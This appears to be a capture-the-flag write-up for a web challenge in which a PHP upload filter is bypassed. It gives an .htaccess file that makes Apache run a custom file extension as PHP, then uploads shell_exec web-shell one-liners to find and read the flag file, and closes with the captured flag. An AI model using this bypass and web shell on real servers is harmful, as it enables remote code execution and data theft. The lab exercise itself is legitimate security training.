

Being devops cannot be improvised!

The developer has programmatically ensured that its file upload form does not accept PHP files, but has the underlying middleware been properly configured?

Your goal is to retrieve the file located in /private/flag.txt from the root of the web server.


First, try to send a file as `.htaccess`
```
AddType application/x-httpd-php .nglong05
AddHandler application/x-httpd-php .nglong05
php_flag engine on
```

**AddType application/x-httpd-php .nglong05**
-    This tells Apache to treat .nglong05 files as PHP scripts.


**AddHandler application/x-httpd-php .nglong05**

-    This ensures that Apache uses the PHP handler when accessing .nglong05 files.
-    Some configurations require AddHandler instead of AddType for executing PHP code.
-    This is especially useful on servers running Apache with mod_php.

**php_flag engine on**

-    This attempts to enable PHP execution, but it only works if PHP is running as an Apache module (mod_php).
-    If the server allows php_flag engine on, it might override any previous restriction disabling PHP execution.


Then, uploading any file with filename with `.nglong05` will make the sever executing php code.
```php
<?php echo shell_exec('find / -type f -name "flag.txt" 2>/dev/null'); ?>
```
```php
<?php echo shell_exec('cat /app/private/flag.txt'); ?>
```
```
Congrats! Here is your flag: ht@cc3ss2RCE4th%w1n
```